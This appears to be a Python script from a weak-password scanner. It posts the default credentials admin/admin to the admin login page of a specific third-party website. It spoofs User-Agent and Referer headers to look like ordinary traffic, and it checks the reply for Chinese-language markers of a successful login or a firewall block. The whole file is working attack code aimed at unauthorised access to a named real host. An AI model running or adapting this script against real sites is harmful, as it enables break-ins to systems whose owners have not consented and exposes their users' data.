# -*- coding:utf-8 -*-
import requests

def login_success_check(content):
    if '您的请求带有不合法参数' in content:
        return False
    if '已被网站管理员设置为拦截' in content:
        return False
    if '当前访问疑似' in content:
        return False
    if '登陆成功' in content:
        return '登陆成功'
    if '退出登陆' in content:
        return '退出登陆'
    if '账号管理' in content:
        return '账号管理'
    if '账号列表' in content:
        return '账号列表'
    if '用户管理' in content:
        return '用户管理'
    # if '个人资料' in content:
    #     return '个人资料'
    # if '欢迎您' in content:
    #     return '欢迎您'
    if '修改密码' in content:
        return '修改密码'
    if '退出系统' in content:
        return '退出系统'
    if '上次登陆时间' in content:
        return '上次登陆时间'
    if '上次登陆IP' in content:
        return '上次登陆IP'
    if '安全设置' in content:
        return '安全设置'
    if '账号绑定' in content:
        return '账号绑定'
    if '退出账号' in content:
        return '退出账号'
    if '文章管理' in content:
        return '文章管理'
    if '消息中心' in content:
        return '消息中心'
    if '管理员设置' in content:
        return '管理员设置'

    if '用户中心' in content:
        return '用户中心'
    if '注销' in content:
        return '注销'
    if '会员列表' in content:
        return '会员列表'
    if '订单列表' in content:
        return '订单列表'
    if '<frame frameborder="0" id="frame_navigation"' in content:
        return '<frame frameborder="0" id="frame_navigation"'
    if 'Router Configuration' in content:
        return 'Router Configuration'


import random
def headers(refer):
    REFERERS = [
        "https://www.baidu.com",
        "http://www.baidu.com",
        "https://www.google.com.hk",
        "http://www.so.com",
        "http://www.sogou.com",
        "http://www.soso.com",
        "http://www.bing.com",
    ]

    headerss = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
        "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]
    if refer:
        pass
    else:
        refer = random.choice(REFERERS)
    headers = {
        'User-Agent': random.choice(headerss),
        'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'max-age=0',
        'referer': refer,
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
    }
    return headers

data = {'NetsysName':'admin',
        'NetsysPass':'admin'}
url = 'http://www.yebaihegongsi.com/admin/Default.asp'
r = requests.post(url=url, data=data ,headers=headers(url),timeout=5)

encoding = requests.utils.get_encodings_from_content(r.text)[0]
res = r.content.decode(encoding, 'replace')
print(res)
print(login_success_check(res))
#print(res.content.decode())